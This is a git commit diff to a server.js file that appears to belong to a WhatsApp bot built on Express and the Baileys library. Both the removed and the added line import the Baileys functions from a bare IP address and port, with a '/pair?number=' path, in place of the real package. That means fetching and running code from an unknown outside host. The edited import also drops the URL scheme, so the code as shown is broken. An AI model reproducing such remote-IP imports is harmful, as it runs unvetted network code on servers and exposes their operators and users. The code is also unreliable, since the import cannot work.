321675b890b949502a2a64c8d82b8da74b4861fa
bdalalybwstt46-art <bdalalybwstt46@gmail.com>
2026-07-06 09:48:08 +0100

    Update import URL for pkg in server.js

--- server.js
+++ server.js
@@ -1,6 +1,6 @@
 import express from 'express';
 import cors from 'cors';
-import pkg from 'http://46.247.108.191:30087/pair?number=';
+import pkg from '46.247.108.191:30087/pair?number=';
 const { makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = pkg;
 
 const app = express();
